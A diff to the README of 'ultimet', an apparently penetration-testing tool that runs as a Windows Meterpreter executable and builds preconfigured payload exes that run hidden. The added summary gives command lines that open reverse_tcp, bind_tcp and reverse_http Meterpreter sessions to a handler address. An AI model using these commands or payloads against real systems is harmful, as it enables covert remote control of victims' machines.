@@ -6,6 +6,34 @@
 
 Usage, examples and faq http://eldeeb.net/wrdprs/?p=176
 
+#0. Executive Summary :)#
+ultimet:
+ - Is a windows executable that can function as various meterpreter flavours, in addition to functioning as "msfpayload" to generate exe files that run hidden when executed.
+ - Supports functioning as the following meterpreter "types": "reverse_tcp", "bind_tcp", "reverse_http", "reverse_https", "metsvc_bind_tcp" and "metsvcreverse_tcp"
+ - Can create exe files that connects upon execution using pre-configured settings "exactly as msfpayload generated exe", however, generated exe files still accept command line arguments and settings could be reset or changed, all supported from within that single exe ... "meterpreter-on-steroids :)".
+ - The generated exe is a pre-configured ultimet that can be used to create OTHER exe files! so, let's say you created a reverse_tcp exe using the `--msfpayload` option, you can use THAT exe later to create another bind_metsvc, then use THAT exe to create a reverse_http ... and so on, or simply reset to default...pretty neat! 
+ _ultimet is a program that once found its way to inside a windows environmet, you won't need msfpayload or msfvenom anymore to create different exe files for different settings, use the same exe for different situations_
+ - The msfpayload-like functionality works under linux perfectly fine using "wine >= 1.3.17", no need to leave your beloved *n?x box to create a pre-configured exe.
+ - Supports many options to load the stage from: Resource, Encrypted-Resource, file, encrypted file or over the network "stager-mode" ... it functions as a non-staged payload "inline" when the stage is provided "either through file or the default bundled-resource".
+ - Offset of ReflectiveLoader function is calculated at runtime and bootstrap is patched in memory, so, in plain english, you can use your own self-compiled metsrv.dll as the stage!.
+ 
+ 
+ _Working as payload:_
+ Example#1: Connect back to a meterpreter/reverse_tcp handler, LPORT=4444, LHOST=192.168.59.132
+ `ultimet.exe -t reverse_tcp -h 192.168.59.132 -p 4444`
+ Example#2: Start listening "bind" on all interfaces waiting for a meterpreter/bind_tcp handler to connect, LPORT=8888
+ `ultimet.exe -t bind_tcp -h 0.0.0.0 -p 8888`
+ Example#3: Load stage from local file, connect back to a meterpreter/reverse_http handler, LPORT=8080, LHOST=192.168.59.132
+ `ultimet.exe -f c:\wwwroot\uploads\metsrv.dll -t reverse_http -h 192.168.59.132 -p 8080`
+
+_Working as msfpayload:_
+ Example#1: msfpayload windows/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.59.132
+ `ultimet.exe -t reverse_tcp -h 192.168.59.132 -p 4444 --msfpayload`
+ Example#2: Reset exe to default and remove all pre-set connection settings
+ `ultimet.exe --reset`
+ Example#3: Remove bundled stage to create a smaller file
+ `ultimet.exe --remove-stage`
+ 
 ---------------
 1. Introduction
 ---------------
@@ -16,14 +44,12 @@ Usage, examples and faq http://eldeeb.net/wrdprs/?p=176
 -------------------
 2. What is ultimet?
 -------------------
-  - ultimet is a flexible "meterpreter" exe that takes LPORT, LHOST, TRANSPORT and many other options as command line arguments.
-  - It supports multiple options to include the "stage" with the exe, turning it into a single stage "inline" meterpreter.
-  - It is NOT a payload "i.e. you can't use it as a shellcode for an exploit", it's a stand-alone exe.
+  - read the executive summary ...
 
 ------------------------------------------------
 3. What are the supported transports (payloads)? 
 ------------------------------------------------
-- It supports "reverse_tcp", "bind_tcp", "reverse_http", "reverse_https" and "bint_metsvc & reverse_metsvc <- when stage included". 
+- It supports "reverse_tcp", "bind_tcp", "reverse_http", "reverse_https" and "bind_metsvc & reverse_metsvc <- when stage included". 
 
 ---------------------------------------
 4. How exactly is the stage "included"? 
